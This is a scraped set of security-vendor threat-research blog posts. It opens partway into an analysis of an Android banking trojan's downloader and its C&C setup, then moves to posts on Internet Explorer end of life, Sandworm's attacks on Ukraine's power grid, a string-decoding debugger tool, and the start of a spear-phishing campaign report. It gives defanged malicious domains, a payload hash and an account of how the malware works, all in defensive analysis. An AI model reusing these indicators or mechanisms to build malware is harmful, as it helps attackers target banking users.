  <b>SlemBunk Downloader: to Grab the Malicious SlemBunk Payload</b></h5>
 <p>The first two apps, although important, do not perform any of the
  intended malicious actions. Instead, they mainly serve as conduits
  that deliver the final malicious payload. They also help attackers to
  achieve a stealthier and more persistent existence on the device.
  First, a longer attack chain makes it much harder for an analyst to
  trace back the origin of the malicious actions. Second, the SlemBunk
  downloader, as shown in last section, will be deleted from storage
  after it is loaded, and thus will only exist in memory. Third, even if
  the malicious action of the SlemBunk payload were detected and
  removed, the more surreptitious downloader could periodically attempt
  to re-download the payload to the device. This section details how
  this downloader works.</p>
 <p>The downloader, when invoked, first performs a device check to see
  if the payload is already installed and running. If not, the
  downloader starts a thread talking to a remote HTTP server that
  customizes how the payload is to be distributed. The remote server is
  hardcoded in the source code, as shown in line 14 in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5. The main thread of SlemBunk downloader
    (from an un-obfuscated sample)</span></p>
 <p>To grab the SlemBunk payload, the downloader first tries to start
  the mobile network (at line 20) and wireless network (at line 26). At
  line 28, it calls Tools.JSON with the hard-coded URL as a parameter to
  start the downloading. The code in lines 34 to 42 tries to install the
  downloaded payload. The code at line 44 starts the newly downloaded
  app. The code at line 45 sends an answering message back to the
  server. And the code at line 46 deletes the app from storage.</p>
 <p>Figure 6 shows the code snippet used to attempt downloading the app.
  First, the CnC server is contacted to get a response (at line 19),
  which is a JSON object. From the code, we can see that there are three
  parameters, as returned by the CnC server. The first one is a path for
  the actual place to download the SlemBunk payload (at line 22), the
  second is the package name for the downloaded app (at line 21), and
  the third parameter is the md5sum of the payload (at line 5).
  Interestingly, we found that the downloader incorporates a simple but
  effective mechanism to ensure that the correct payload is downloaded.
  From lines 24 to 27, it keeps attempting the downloading action until
  the MD5 value of the downloaded app is the same as the last parameter
  returned from the CnC server.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6. Communication details with the CnC server</span></p>
 <p>Using a browser to access the hard-coded URL confirmed our findings.
  Figure 7 is a screenshot that shows an example of the returned JSON
  string. As shown in the red boxes, the three keys are “path”,
  “package” and “md5sum”, which are exactly the same as shown in lines
  15 to 17 in Figure 6. The values for these keys further confirm our
  analysis. The first parameter gives the path to download the payload:
    <span class=""code"">&quot;xxxvideotube[.]org/AdobeFlashPlayerUpdate&quot;</span>.
  The second parameter is the package name of the downloaded app:
  “org.slempo.service”. And the third parameter is the md5sum for this
  app: “288AD03CC9788C0855D446E34C7284EA”.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure7.png"" />
  <span class=""type-XS"">Figure 7. The response from the CnC server</span></p>
 <h5>
  <b>Better-Organized Campaign?</b></h5>
 <p>The use of a drive-by download to distribute the SlemBunk payload
  and the details of the CnC server communication suggest that this
  campaign is well-organized and continuing to evolve. As we continued
  our investigation, we found other interesting facts that support this
  assessment. First, the administrative interface hosted on the CnC
  server (described below) implies that the CnC server is customizable
  and that the SlemBunk payload can easily adapt per the attacker’s
  specifications. Second, the timeline information for the domains
  associated with this attack showed that this campaign is very recent,
  still ongoing, and very likely to continue evolving into different
  forms. We will keep a close eye on its development.</p>
 <h5>
  <b>High Customizability</b></h5>
 <p>Line 14 in Figure 5 shows the CnC server and the query string that
  the SlemBunk downloader uses to determine the payload to download.
  Opening the CnC server in a web browser brings us to the login page
  shown in Figure 8. The title of this page shows <b>
    <i>“app-setuper-admin – login page”.</i></b> The text on the page,
  when translated into English from the original Russian, reads
  “authorization,” “login,” and “password.” We believe this is the
  administrative interface for the attacker to customize how the CnC
  server should feed the payload to the downloader clients. It seems
  that the attackers are trying to develop this into a more organized
  campaign. The JSON object, as returned by the CnC server (as shown in
  Figure 7), also strengthens this theory.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8. App setup admin UI to customize the
    CnC configuration</span></p>
 <p>
  <b>Timeline of the Drive-by Downloading Campaign</b></p>
 <p>We identified three domains directly related to this drive-by
  downloading campaign. Domain “xxxvideotube,” registered on Aug. 28,
  2015, is used to host the SlemBunk dropper and payloads. Domain
  “brutaltube4mobile,” registered on Nov. 22, 2015, acts as the CnC
  server to host the payload configuration query and also the admin panel.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure9.png"" />
  <span class=""type-XS"">Figure 9. A new CnC domain found in one SlemBunk dropper</span></p>
 <p>Among the latest samples we collected, we found a domain named
  “f8gr8e8tg[.]com” that replaces “brutaltube4mobile” as the CnC server
  (as shown in Figure 9). However, this domain seems to be dormant right
  now, and the corresponding app also reported failure when we attempted
  to start the app on the device. The domain registration records show
  that this domain was registered on Dec. 1, 2015.</p>
 <p>Putting the registration records of these three domains together
  (Figure 10), we might be able to deduce a kind of developing
  relationship. When the first domain, &quot;xxxvideotube[.]org,&quot;
  was created on Aug. 27, 2015 (four months ago), it might have been
  used only for the SlemBunk payload. The SlemBunk payload app hosted at
  &quot;xxxvideotube[.]org/AdobeFlashPlayerUpdate[.]apk&quot; has no
  dependency on the CnC server (the second domain in Figure 10). When
  the second domain (the CnC server) was set up on Nov. 22, 2015 (one
  month ago), the SlemBunk dropper app hosted at
  &quot;xxxvideotube[.]org/AdobeUpdate[.]apk&quot; was able to use this
  new CnC server to download the customized payload. The last domain
  seems to be a new attempt from the attacker. For some reason, it is
  not functioning well. In summary, we believe that this campaign
  activity is very recent, still ongoing, and possibly evolving into
  different forms.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/slembunkpt2/Figure10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10. Registration records for SlemBunk domains</span></p>
 <p>Finally, the domain “brutaltube4mobile[.]com” was registered using
  the email address oodookree[@]gexmails[.]com. That email address was
  also used to register four other domains “brutalmobiletube[.com],”
  “brutalmobiletubes[.]com,” “adobeupdate,[.]org” and
  “australiamms[.]com”. Our initial study showed that the domain
  “australiamms[.]com” is used to host a CnC server for SlemBunk
  campaign. The domains “adobeupdate[.]org” and “brutalmobiletube[.]com”
  are dedicated for another malware campaign, which will be analyzed in
  detail in another upcoming blog. At this time we are not sure if there
  is a malicious purpose for the domain “brutalmobiletubes.[”]com&quot;.</p>
 <h5>
  <b>Conclusion</b></h5>
 <p>SlemBunk is an evolving family of Android trojans that target mobile
  banking app users throughout the world. In this article, we presented
  the prolonged attack chain that we identified in its latest
  development, and the data to show that this campaign is a very recent,
  still ongoing effort that might develop into different forms. The
  FireEye mobile research team will keep a close eye on this.</p>",http://www.fireeye.com/blog/threat-research/2016/01/slembunk-part-two.html
The Dangers of Downloads: Securing Mobile Devices in 2016,"<p>In 2015, mobile malware attacks were on the rise; from 2014 to 2015
  we saw an increase of 61% in the number of these attacks.</p>
 <p>Malware has a clear progression path; it starts out targeting
  unsuspecting users who are likely to open unknown attachments or
  install unknown applications. The primary target? The user’s
  information. Think of the early Trojans that used infected machines
  for DDOS attacks or spam. Then the malware writers start to go after
  the users’ finances, identity and bank transfers. Finally, the malware
  morphs into targeted attacks at enterprise resources.</p>
 <p>Mobile malware follows the same path. Early on, attackers used
  malicious apps to send premium SMS messages, racking up huge wireless
  bills for the unwary user, or getting them to install unwanted
  applications. Then the malware writers started to target the users’
  bank credentials.</p>
 <p>The recent <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2016/01/slembunk-part-two.html"">SlemBunk attack</a>
  is just the latest of these types of attacks. We also saw attacks in
  2015 that targeted Android and increasingly iOS users, including the
    <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/11/xcodeghost_s_a_new.html"">iOS
    XCode Ghost</a> and the iBackdoor attack.</p>
 <p>These mobile malware examples prove that you need a complete mobile
  security solution for 2016. Using an Enterprise Mobility Management
  (EMM) platform, like the one offered by AirWatch in conjunction with
  the FireEye MTP solution, is necessary to secure your mobile infrastructure.</p>
 <hr />
  <div class=""c00 c00v0"">
  <div class=""button section"" style=""float: right;"">
    <a class=""btn btn-secondary"" href=""http://bit.ly/1RiC3QW"" target=""_blank"">Register Now</a></div> <h3 style=""margin-left: 8.0px;"">Join us for a free webinar!</h3> <p style=""margin-left: 8.0px;"">FireEye and AirWatch team up to discuss
    the latest mobile risks on Android<br /> and iOS, and how you can
    protect your organization and employees.<br /> Thurs, Jan. 28, 2016
    (2 p.m. ET/11 a.m. PT)</p> </div>
 <hr />",http://www.fireeye.com/blog/threat-research/2016/01/the_dangers_of_downl.html
"End of Life for Internet Explorer 8, 9 and 10","<p>Microsoft has started the year with an <a href=""https://www.microsoft.com/en-us/WindowsForBusiness/End-of-IE-support"">announcement</a>
  that, effective Jan. 12, 2016, support for all older versions of
  Internet Explorer (IE) will come to an end (known as an EoL, or End of
  Life). The affected versions are Internet Explorer 7, 8, 9, and 10.</p>
 <p>What this means for users is that Microsoft will no longer release
  new security updates for these product versions going forward. This
  gives users two options: Internet Explorer 11 and Microsoft Edge, the
  latter of which is currently exclusive to Windows 10. If users would
  like to keep their browsers up to date, they will need to upgrade to
  either of these two options.</p>
 <p>It should go without saying that Internet Explorer users are
  strongly encouraged to update to the latest version. It offers
  improved security with the latest security features and mitigations.
  Two notable mitigations introduced to the browser in 2014 are Isolated
  Heap and Memory Protect, which were implemented on Patch Tuesday of
  June and July 2014 respectively. Prior to that, Microsoft made a
  similar announcement about the Windows XP Operating System, wherein
  they issued an End of Life for XP in April 2014.</p>
 <p>These are all steps in right direction for the Microsoft teams
  because it allows for the consolidation of team efforts, resulting in
  a stronger focus on securing fewer versions across a smaller code
  base. Microsoft continues to silently enhance protections as the
  months go by while at the same time trimming code.</p>
 <p>Figure 1 shows the vulnerability counts for Internet Explorer
  versions in 2015.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EOL%20for%20IE%208%2C9%2C10/Figure%201.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1. Internet Explorer vulnerability count
    for 2015 [1]</span></p>
 <p>The graph above shows the total number of reported vulnerabilities
  affecting each version of Internet Explorer across the months of 2015.
  Keeping in mind that these are non-unique counts, we can observe that,
  for the most part, the majority of the reported vulnerabilities
  affected Internet Explorer 11.</p>
 <p>Figure 2 shows the most notable in the wild (ITW) attacks exploiting
  Internet Explorer in 2014 and 2015.</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""148""><p>Year</p> </td> <td valign=""top"" width=""148""><p>CVE</p> </td> <td valign=""top"" width=""148""><p>Affects</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""148""><p>2014</p> </td> <td valign=""top"" width=""148""><p>
          <a href=""http://www.fireeye.com/blog/uncategorized/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html"">CVE-2014-0322</a></p>
      </td> <td valign=""top"" width=""148""><p>IE 9 and 10</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""148""><p>2014</p> </td> <td valign=""top"" width=""148""><p>
          <a href=""http://www.fireeye.com/blog/uncategorized/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html"">CVE-2014-1776</a></p>
      </td> <td valign=""top"" width=""148""><p>IE 6 to 11</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""148""><p>2015</p> </td> <td valign=""top"" width=""148""><p>
          <a href=""https://www.fireeye.com/blog/threat-research/2015/08/cve-2015-2419_inte.html"">CVE-2015-2419</a></p>
      </td> <td valign=""top"" width=""148""><p>IE 10 and 11</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""148""><p>2015</p> </td> <td valign=""top"" width=""148""><p>
          <a href=""http://krebsonsecurity.com/2015/08/microsoft-pushes-emergency-patch-for-ie/"">CVE-2015-2502</a></p>
      </td> <td valign=""top"" width=""148""><p>IE 7 to 11</p> </td> </tr></tbody></table>
 <p>
  <span class=""type-XS"">Figure 2. ITW attacks of Internet Explorer [1]</span></p>
 <p>The majority of the attacks found ITW in 2014 and 2015 affected IE 11.</p>
 <p>Figure 3 compares the count of vulnerabilities that affect Internet
  Explorer 11 (IE 11) to the ones that don’t.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EOL%20for%20IE%208%2C9%2C10/Figure%203.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3.</span> <span class=""type-XS"">IE11 vs.
    Non-IE11 vulnerability count [1]</span></p>
 <p>Based on the information found in Figures 1, 2, and 3, most of the
  vulnerabilities reported in 2015 affected Internet Explorer 11. This
  shows that attackers, as well as researchers, are focusing
  considerably on Internet Explorer 11. Microsoft’s most recent move
  will allow the company to do the same.</p>
 <p>It should be noted that, as of Internet Explorer 11, some features
  are no longer supported or are considered deprecated. These include,
  but are not limited to, <a>VML</a> and <a>VBScript</a>, which have
  been used to <a href=""http://www.vupen.com/blog/20130522.Advanced_Exploitation_of_IE10_Windows8_Pwn2Own_2013.php"">exploit</a>
  and <a href=""https://technet.microsoft.com/en-us/library/security/ms14-064.aspx"">compromise</a>
  the integrity of Internet Explorer, or leveraged to bypass ASLR/DEP in
  the past. This is a strong move in the right direction, as trimming
  the code base leads to shrinking the attack surface. This helps secure
  products such as Internet Explorer.</p>
 <p>It is also worth noting that at this point no ITW attacks have been
  observed against Microsoft Edge, the new web browser that currently
  ships exclusively with Windows 10. Microsoft Edge also follows the
  same approach of removing unnecessary features such as ActiveX and
  Browser Helper Objects, as well as <a href=""https://blogs.windows.com/msedgedev/2015/05/06/a-break-from-the-past-part-2-saying-goodbye-to-activex-vbscript-attachevent/"">others</a>.</p>
 <p>In conclusion, after Jan. 12, 2016, older Internet Explorer users
  will be exposed to vulnerabilities that may be exploited by malware
  and targeted by Exploit Kits. The best way to defend against this is
  to keep your browser up to date by upgrading to Internet Explorer 11
  or using Microsoft Edge.</p>
 <p>[1] Microsoft Security Bulletins: <a href=""https://technet.microsoft.com/en-us/library/security/dn610807.aspx"">https://technet.microsoft.com/en-us/library/security/dn610807.aspx</a></p>",http://www.fireeye.com/blog/threat-research/2016/01/end_of_life_for_ie.html
Sandworm Team and the Ukrainian Power Authority Attacks,"<div class=""c00 c00v1"" style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/isight/isight-partners-sandworm-blog-07jan20161.png"" />
  <br /> <h3 style=""text-align: left;"">
    <br /> Update 1.11.16 - SANS ICS Team Connects Dots</h3> <h5 style=""text-align: left;"">Updating the blog entry to bring attention
    to the recent analysis published by Mike Assante from the SANS ICS
  team.</h5> <p style=""text-align: left;"">&quot;After analyzing the
    information that has been made available by affected power
    companies, researchers, and the media it is clear that cyber attacks
    were directly responsible for power outages in Ukraine. The SANS ICS
    team has been coordinating ongoing discussions and providing
    analysis across multiple international community members and
    companies. We assess with high confidence based on company
    statements, media reports, and first-hand analysis that the incident
    was due to a coordinated intentional attack.&quot;</p> <p style=""text-align: left;"">Read the <a href=""http://ics.sans.org/blog/2016/01/09/confirmation-of-a-coordinated-attack-on-the-ukrainian-power-grid?utm_source=hs_email&amp;utm_medium=email&amp;utm_content=25135530&amp;_hsenc=p2ANqtz-87XLhYBXFcESdxOIJIB8DSoYBZ5sPrfHQv9xNUp11BwFsfcUBouRDj-R7y6YcJY2BsrUeKvRVbwO4lPcVAPgHLmDrj7w&amp;_hsmi=25135530"" target=""_blank"">full SANS post here</a> - and see below for
  iSIGHT</p> <h6 style=""text-align: left;"">iSIGHT Partners Analyst
  Comment</h6> <p style=""text-align: left;"">The SANS ICS blog confirms
    conclusions previously reached by iSIGHT regarding the nature of the
    Ukrainian attacks (specifically the role of destructive malware and
    phone disruption) and attribution to Sandworm Team. iSIGHT Partners
    believes this incident is a milestone because it is the first major
    cyber attack to substantially affect the civilian population and
    because of the overwhelming importance of the grid to multiple
    reliant sectors. Furthermore, Sandworm Team's previous interest in
    US and European critical systems underscores the threat they pose
    (see below for more on Sandworm Team.)</p> <h3 style=""text-align: left;"">Sandworm Team - Historical Targeting of
    Ukraine and Interest in SCADA Systems</h3> <p style=""text-align: left;"">Since last week, iSIGHT Partners has
    worked to provide details on the power outage in Ukraine to our
    global customers. We have analyzed the forensic evidence we have
    been able to obtain from the region, contextualizing it within our
    knowledge of cyber espionage actors. Many details of the event
    remain unknown, and given the nature of the incident, especially the
    use of destructive malware, we do not anticipate every detail will
    be exposed.</p> <p style=""text-align: left;"">However, we have linked
    Sandworm Team to the incident, principally based on BlackEnergy 3,
    the malware that has become their calling card.</p> <p style=""text-align: left;"">iSiGHT Partners has tracked Sandworm Team
    for some time - and we publicly reported on some of their activities
      in<a href=""http://www.isightpartners.com/2014/10/cve-2014-4114/"" target=""_blank""> October 2014</a>, when we discovered their use of
    a zero-day exploit, <a href=""https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4114"" target=""_blank"">CVE-2014-4114</a>. In that campaign, we saw
    targeting of Ukrainian government officials, members of the EU and
    NATO. Shortly after releasing information on their espionage
    operations, our friends at <a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/"" target=""_blank"">TrendMicro</a> found evidence that the operators
    were not only conducting classic strategic espionage but <a href=""http://www.isightpartners.com/2014/10/sandworm-team-targeting-scada-systems/"" target=""_blank"">targeting SCADA systems </a>as well. Evidence of
    this accumulated, and iSIGHT Partners released a<a href=""http://www.isightpartners.com/2014/10/sandworm-team-targeting-scada-systems/"" target=""_blank""> follow-up blog </a>were we assessed that activity
    was reconnaissance for attack - a preparation for cyber attack to be
    carried out in the long term. ICS-CERT released <a href=""https://ics-cert.us-cert.gov/alerts/ICS-ALERT-14-281-01B"" target=""_blank"">a separate advisory</a> as well.</p> <h3 style=""text-align: left;"">Sandworm Team Activity - Late 2014 to
    Current Day</h3> <p style=""text-align: left;"">Sandworm Team went to
    ground shortly after being exposed in October of 2014, and malware
    with Dune references (the genesis for the 'Sandworm' moniker) which
    we had previously used to track them disappeared entirely. However,
    the unique malware variant, BlackEnergy 3, reemerged in Ukraine
    early in 2015, where we had first found Sandworm Team. Throughout
    2015 we saw increased intrusion activity using BlackEnergy 3. We
    warned our clients of new features suggesting an increased focus on
    European targets - though verification of targets was not possible
    at the time. Additionally, we warned our customers about the
    targeting of both media and regional power authorities in the
    Ukraine, sectors later affected by cyber attacks. Some of this
    information was recently shared by the<a href=""https://ics-cert.us-cert.gov/alerts/ICS-ALERT-14-281-01B"" target=""_blank""> folks at ESET</a>, who have also been following
    Sandworm Team very closely for quite some time.</p> <h3 style=""text-align: left;"">On the Ukrainian Power Authority
  Incidents</h3> <p style=""text-align: left;"">Last week iSIGHT's sources
    provided us with the same KillDisk malware published by <a href=""https://ics.sans.org/blog/2016/01/01/potential-sample-of-malware-from-the-ukrainian-cyber-attack-uncovered"" target=""_blank"">Rob Lee of SANS and Dragos Security</a>. As ESET
    has, we place this malware within the greater context of activity
    tied to BlackEnergy 3, which we believe is Sandworm Team. We believe
    this KillDisk malware is related to the destructive malware
    leveraged during Ukrainian elections in October. At the time, <a href=""http://cert.gov.ua/?p=2370"" target=""_blank"">CERT-UA
      connected that incident to BlackEnergy 3</a>. Symantec has since
      <a href=""http://www.symantec.com/connect/blogs/destructive-disakil-malware-linked-ukraine-power-outages-also-used-against-media-organizations"" target=""_blank"">verified those claims</a>. Furthermore, iSIGHT's
    own sources indicate that BlackEnergy 3 malware was deployed on at
    least one of the Ukrainian power systems affected by KillDisk.</p>
    <p style=""text-align: left;"">iSIGHT Partners is still collecting
    information on the mechanics of the power outage and what role the
    KillDisk malware played in the greater event. We cannot confirm that
    the KillDisk malware caused the outage. It may have been used
    following steps to manipulate power in order to impede restoration
    efforts or operator visibility. It is noteworthy that technical
    support numbers associated with the power authorities were allegedly
    flooded with calls, which may have been an effort to further
    overwhelm responders. On their official website, the Ukrainian
    security service, SBU, made this claim.</p> <h3 style=""text-align: left;"">Outlook</h3> <p style=""text-align: left;"">A
    cyber attack of this nature is a milestone -although a predictable
    one. The aggressive nature of Sandworm Team's previous activity in
    Europe and the United States exposed their interest in targeting
    critical systems and indicated preparation for cyber attack.
    Targeting of critical entities in Ukraine throughout 2015, during a
    time of war, further presaged a desire to disrupt
  infrastructure.</p> </div>",http://www.fireeye.com/blog/threat-research/2016/01/ukraine-and-sandworm-team.html
FLARE Script Series: Automating Obfuscated String Decoding,"<h5>
  <b>Introduction</b></h5>
 <p>We are expanding our script series beyond IDA Pro. This post extends
  the FireEye Labs Advanced Reverse Engineering (FLARE) script series to
  an invaluable tool for the reverse engineer – the debugger. Just like
  IDA Pro, debuggers have scripting interfaces. For example, OllyDbg
  uses an asm-like scripting language, the Immunity debugger contains a
  Python interface, and Windbg has its own language. Each of these
  options isn’t ideal for rapidly creating string decoding debugger
  scripts. Both Immunity and OllyDbg only support 32-bit applications,
  and Windbg’s scripting language is specific to Windbg and, therefore,
  not as well-known. The <a href=""https://pykd.codeplex.com/"">pykd</a> project was created to
  interface between Python and Windbg to allow debugger scripts to be
  written in Python. Because malware reverse engineers love Python, we
  built our debugger scripting library on top of pykd for Windbg.</p>
 <p>Here we release a library we call <span class=""code"">flare-dbg</span>. This library provides several utility
  classes and functions to rapidly develop scripts to automate debugging
  tasks within Windbg. Stay tuned for future blog posts that will
  describe additional uses for debugger scripts!</p>
 <h5>
  <b>String Decoding</b></h5>
 <p>Malware authors like to hide the intent of their software by
  obfuscating their strings. Quickly deobfuscating strings allows you to
  quickly figure out what the malware is doing.</p>
 <p>As stated in Practical Malware Analysis, there are generally two
  approaches to deobfuscating strings: self-decoding and manual
  programming. The <i>self-decoding</i> approach allows the malware to
  decode its own strings. <i>Manual programming</i> requires the reverse
  engineer to reprogram the decoding function logic. A subset of the
  <i>self-decoding</i> approach is emulation, where each assembly
  instruction execution is emulated. Unfortunately, library call
  emulation is required, and emulating every library call is difficult
  and may cause inaccurate results. In contrast, a debugger is attached
  to the actual running process, so all the library functions can be run
  without issue. Each of these approaches has their place, but this post
  teaches a way to use debugger scripting to automatically self-decode
  all obfuscated strings.</p>
 <h5>
  <b>Challenge</b></h5>
 <p>To decode all obfsucated strings, we need to find the following: the
  string decoder function, each time it is called, and all arguments to
  each of those instances. We then need to run the function and read out
  the result. The challenge is to do this in a semi-automated way.</p>
 <h5>
  <b>Approach</b></h5>
 <p>The first task is to find the string decoder function and get a
  basic understanding of the inputs and outputs of the function. The
  next task is to identify each time the string decoder function is
  called and all of the arguments to each call. Without using IDA, a
  handy Python project for binary analysis is <a href=""https://github.com/vivisect/vivisect"">Vivisect</a>. Vivisect
  contains several heuristics for identifying functions and
  cross-references. Additionally, Vivisect can emulate and disassemble a
  series of opcodes, which can help us identify function arguments. If
  you haven’t already, be sure to check out the FLARE scripting series
  post on <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/11/flare_ida_pro_script.html"" target=""_blank"">tracking function arguments using emulation</a>,
  which also uses Vivisect.</p>
 <h5>
  <b>Introducing flare-dbg</b></h5>
 <p>The FLARE team is introducing a Python project, <span class=""code"">flare-dbg</span> that runs on top of pykd. Its goal is to
  make Windbg scripting easy. The heart of the <span class=""code"">flare-dbg</span> project lies in the <span class=""code"">DebugUtils</span> class, which contains several functions
  to handle:</p>
 <p>·      Memory and register manipulation<br /> ·      Stack
  operations<br /> ·      Debugger execution<br /> ·     
  Breakpoints<br /> ·      Function calling</p>
 <p>In addition to the basic debugger utility functions, the <span class=""code"">DebugUtils</span> class uses Vivisect to handle the
  binary analysis portion.</p>
 <h5>
  <b>Example</b></h5>
 <p>I wrote a simple piece of malware that hides strings by encoding
  them. Figure 1 shows an HTTP User-Agent string being decoded by a
  function I named <span class=""code"">string_decoder.</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/Figure1flaretyler.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: String decoder function reference in
    IDA Pro</span></p>
 <p>After a cursory look at the string_decoder function, the arguments
  are identified as an offset to an encoded string of bytes, an output
  address, and a length. The function can be described as the following
  C prototype:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/code_snippet_C_prototype.jpg"" /></p>
 <p>Now that we have a basic understanding of
  the string_decoder function, we test decoding using Windbg and
  flare-dbg. We begin by starting the process with Windbg and executing
  until the program’s entry point. Next, we start a Python interactive
  shell within Windbg using pykd and import flaredbg.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/code_snippet_windbg_part1.jpg"" /></p>
 <p>Next, we create a <span class=""code"">DebugUtils</span> object, which
  contains the functions we need to control the debugger.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/code_snippet_windbg_part2.jpg"" /></p>
 <p>We then allocate 0x3A-bytes of memory for the output string. We use
  the newly allocated memory as the second parameter and setup the
  remainder of the arguments.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/code_snippet_windbg_part3.jpg"" /></p>
 <p>Finally, we call the string_decoder function at virtual address
  0x401000, and read the output string buffer.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/code_snippet_windbg_part4.jpg"" /></p>
 <p>After proving we can decode a string with <span class=""code"">flare-dbg</span>, let’s automate all calls to the <span class=""code"">string_decoder</span> function. An example debugger
  script is shown in Figure 2. The full script is available in the
  examples directory in the github repository.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/Figure2flaretyler.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. Example basic debugger script</span></p>
 <p>Let’s break this script down. First, we identify the function
  virtual address of the string decoder function and create a <span class=""code"">DebugUtils</span> object. Next, we use the <span class=""code"">DebugUtils</span> function <span class=""code"">get_call_list</span> to find the three push arguments for
  each time <span class=""code"">string_decoder</span> is called.</p>
 <p>Once the <span class=""code"">call_list</span> is generated, we
  iterate all calling addresses and associated arguments. In this
  example, the output string is decoded to the stack. Because we are
  only executing the string decoder function and won’t have the same
  stack setup as the malware, we must allocate memory for the output
  string. We use the third parameter, the length, to specify the size of
  the memory allocation. Once we allocate memory for the output string,
  we set the newly allocated memory address as the second parameter to
  receive the output bytes.</p>
 <p>Finally, we run the <span class=""code"">string_decoder</span>
  function by using the <span class=""code"">DebugUtils call</span> function and read the result from
  our allocated buffer. The call function sets up the stack, sets any
  specified register values, and executes the function. Once all strings
  are decoded, the final step is to get these strings back into our
  IDB. The <span class=""code"">utils</span> script contains utility
  functions to create IDA Python scripts. In this case, we output an IDA
  Python script that creates comments in the IDB.</p>
 <p>Running this debugger script produces the following output:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/windbg_run_script_results.jpg"" /></p>
 <p>The output IDA Python script creates repeatable comments on all
  encoded string locations, as shown in Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/FlareTylerDean/Figure3flaretyler.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. Decoded string as comment</span></p>
 <h5>
  <b>Conclusion</b></h5>
 <p>Stay tuned for another debugger scripting series post that will
  focus on plugins! For now, head over to the <a href=""https://github.com/fireeye/flare-dbg"">flare-dbg github</a>
  project page to get started. The project requires <a href=""https://pykd.codeplex.com/"">pykd</a>,<a href=""http://winappdbg.sourceforge.net/"">winappdbg</a>, and <a href=""https://github.com/vivisect/vivisect"">vivisect</a>.</p>",http://www.fireeye.com/blog/threat-research/2015/12/flare_script_series.html
The EPS Awakens - Part 2,"<p>On Wednesday, Dec. 16,<sup> </sup>2015, FireEye published <a href=""https://www.fireeye.com/blog/threat-research/2015/12/the_eps_awakens.html"">The
    EPS Awakens</a>, detailing an exploit targeting a previously unknown
  Microsoft Encapsulated Postscript (EPS) <i>dict</i> copy
  use-after-free vulnerability that was silently patched by Microsoft on
  November 10, 2015. The blog described the technical details of the
  vulnerability, and the steps needed to bypass the EPS filter and
  obtain full read and write access to the system memory.</p>
 <p>In this follow-up blog, we discuss the operational details of the
  spear phishing campaigns associated with the exploit. Specifically, we
  detail the lures, attachments, targeting and malware, and examine the
  China-based advanced persistent threat (APT) group responsible for one
  of the observed attacks.</p>
 <p>
  <span class=""type-ML"">Activity Summary</span>
  <br /> </p>
 <p>Between November 26, 2015, and December 1, 2015, known and suspected
  China-based APT groups launched several spear phishing attacks
  targeting Japanese and Taiwanese organizations in the high-tech,
  government services, media and financial services industries. Each
  campaign delivered a malicious Microsoft Word document exploiting the
  aforementioned EPS <i>dict</i> copy use-after-free vulnerability, and
  the local Windows privilege escalation vulnerability CVE-2015-1701.
  The successful exploitation of both vulnerabilities led to the
  delivery of either a downloader that we refer to as IRONHALO, or a
  backdoor that we refer to as ELMER.</p>
 <p>
  <span class=""type-ML"">Thanksgiving Day Parade</span>
  <br /> </p>
 <p>On November 26, 2015, a suspected China-based APT group sent
  Japanese defense policy-themed spear phishing emails to multiple
  Japanese financial and high-tech companies. As shown in Figure 1, the
  emails originated from the Yahoo! email address
  <b>mts03282000@yahoo.co[.]jp</b>, and contained the subject
  “<b>新年号巻頭言の送付</b>” (Google Translation: Sending of New Year No. Foreword).</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/figure1.png"" />
  <span class=""type-XS"">Figure 1. November 26, 2015 Phish SMTP header</span>
